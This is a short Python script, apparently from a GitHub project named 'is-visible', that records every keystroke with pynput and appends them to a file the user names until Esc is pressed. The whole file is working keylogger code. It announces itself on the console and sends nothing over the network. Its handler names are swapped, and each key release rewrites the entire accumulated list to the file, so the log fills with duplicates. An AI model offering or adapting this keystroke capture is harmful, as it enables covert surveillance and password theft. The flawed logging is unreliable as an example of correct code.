import typer
from rich.console import Console
from pynput.keyboard import Key, Listener

app = typer.Typer()
console = Console()

@app.command()
def main(filename: str):
          records = []

          def on_key_down(key):
                    console.log(console.status("[bright_green]Writing...[/bright_green]"))
                    records.append(key)
                    write(records)

          def on_key_up(key):
                    if key == Key.esc:
                              return False

          def write(var):
                    with open(filename, "a") as f:
                              for i in var:
                                        new_var = str(i).replace("'", "")
                                        f.write(new_var)
                                        f.write(" ")

          project = "[bright_green]$ Is-Visible - For Advance Users[/bright_green]"
          github_repo = "[bright_blue]https://github.com/Aadityansha/is-visible[/bright_blue]"
          console.print(f"{project}")
          console.print(f"$ Github Repository => {github_repo}")
          console.print(f"[bright_magenta]all records will be at {filename} [/bright_magenta]")
          console.print("[bright_yellow]Use --help for more information.[/bright_yellow]")
          console.print("[bright_red]Press Esc Key to stop[/bright_red]")
          
          with Listener(on_press=on_key_up, on_release=on_key_down) as l:
                    l.join()

if __name__ == "__main__":
          app()